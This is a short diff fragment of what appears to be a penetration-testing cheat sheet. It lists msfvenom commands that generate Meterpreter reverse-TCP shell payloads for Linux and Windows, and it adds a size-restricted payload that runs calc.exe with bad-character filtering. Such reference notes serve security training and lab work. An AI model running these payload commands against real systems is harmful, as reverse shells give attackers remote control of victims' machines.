@@ -120,4 +120,6 @@ Staged
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf   
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 
 
+Unstaged size restricted 
+msfvenom -p windows/exec CMD=calc.exe -b "x00" -f py
 ````
